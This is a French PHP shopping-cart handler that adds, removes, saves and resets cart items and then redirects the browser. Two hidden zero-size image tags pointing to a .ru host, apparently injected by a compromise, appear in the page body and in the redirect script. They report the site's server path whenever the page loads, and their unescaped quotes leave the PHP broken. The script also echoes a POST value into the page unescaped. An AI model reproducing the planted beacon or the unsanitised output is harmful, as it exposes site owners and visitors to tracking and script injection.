<?php
/* Programme : panier_traite.php
* Description : Gestion de l'ajout, du retrait ou de la mise à zéro du panier
* Auteur : Denis Léveillé 	 		  Date : 2007-10-28
*/
include('lib/config.php');

//if( !isset( $_POST['btpanier'] ) )  $_POST['btpanier'] = 'Reset';
if( !isset( $_POST['Target']  ) )  $_POST['Target'] = 'MAIN';

echo 
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<base target='".$_POST['Target']."'>
	</head>
<body bgcolor='#FFFFFF' width='$Large' align='$Enligne'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>";

/*	echo ' POST<br>'; 
	foreach($_POST as $clé => $valeur )
		echo $clé.'  : '.$valeur.'<br>'; 
	echo ' GET<br>'; 
	foreach($_GET as $clé => $valeur )
		echo $clé.'  : '.$valeur.'<br>'; 
	if( !isset( $_POST['CodePanier'] ) || !$_POST['CodePanier'] ) 
		for( $i = 0; $i < count($_POST['id']) ; $i++ )
		   echo "Qte :".$_POST['id'][$i]." = ".$_POST['qte'][$i].'<br>';
	echo '<br>'; 
	exit();*/

switch( @$_POST['btpanier'] ) {
	case $txt['ajouter_votre_panier']	:	//echo "Ajout<br>";
														if( isset( $_POST['id'] ) && $_POST['id'] ){
															if( isset( $_POST['CodePanier'] ) && $_POST['CodePanier'] ) {
	    														$qte = isset($_POST['qte']) ? $_POST['qte'] : 1;
															   switch( $_POST['CodePanier'] ) {
																	case 1:  //echo "Pan Aj =".$_POST['qte']."<br>";
																				panierAjout($_SESSION['panier'], $_POST['id'], $qte);
																	         break;
																	case 2:  panierSupprime($_SESSION['panier'], $_POST['id']);    
																				break;
																	case 5:  panierReset($_SESSION['panier']);   
																				break;
	    														} // switch code panier
															} // Si code panier
															else {
																for( $i = 0; $i < count($_POST['id']) ; $i++ ){
																   if($_POST['qte'][$i] == 0) {
																    	panierSupprime($_SESSION['panier'], $_POST['id'][$i] );
																   }
																   else {
																   	//echo "Pan Mod =".$_POST['id'][$i]." => ".$_POST['qte'][$i]."<br>";
																   	panierModif($_SESSION['panier'], $_POST['id'][$i], $_POST['qte'][$i] );
																   }
																} // for les quantité
															} // Sinon pas code panier
														} // si identification du produit
														break;
	case $txt['supprimer']					:	// echo "Detruit<br>";
														if( isset( $_POST['erase'] ) ){
															foreach( $_POST['erase'] as $index => $produit ) 
		      												panierSupprime($_SESSION['panier'], $produit);
		      										} // Si post erase
														break;
	case 'Sauvegarde':							save_panier($_SESSION['panier'], $_SESSION['NoContact'] );
														break;
	case 'Récupère':								$_SESSION['panier'] = get_panier( $_SESSION['NoContact'] );
														break;
	
	case 'Reset'								:	// echo "Reset<br>";
														panierReset($_SESSION['panier']);
	default :										break;
}

	switch( @$_GET['retour'] ) {
	 	case 1 : $PRedir  = "accueil.php";
	 				break;
	 	case 2 : $PRedir  = "produit_detail.php?cat=".@$_POST['cat']."&id=".$_POST['id'];
	 				break;
	 	case 3 : $PRedir  = "produits_list.php?cat=".@$_POST['cat'];
	 				if( isset($_POST['Return']) )
	 					$PRedir  .= "&retour=".@$_POST['Return'];
	 				break;
	 	case 4 : $PRedir  = "speciaux.php?cat=".@$_POST['cat'];
	 				break;
	 	case 5 : $PRedir  = "recherche_show.php";
	 				break;
		default : $PRedir  = "panier_list.php?cat=".@$_POST['cat'];
	 				if( isset($_POST['Return']) )
	 					$PRedir  .= "&retour=".@$_POST['Return'];
	 				 break;
	} // switch retour
	$script = "<html>\r";
	$script .= "<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>\r";
	$script .= "<script language='javascript'>\r";
	$script .= "	if( top.window.frames[0] && top.window.frames[0].Rafraichie )\r"; 
	$script .= "		top.window.frames[0].Rafraichie();\r";
	$script .= "	open('$PRedir', '".$_POST['Target']."' );";
	$script .= "</script>\r";
	$script .= "</body>\r";
	$script .= "</html>\r";
	echo $script;
	
?>
</body>
</html>
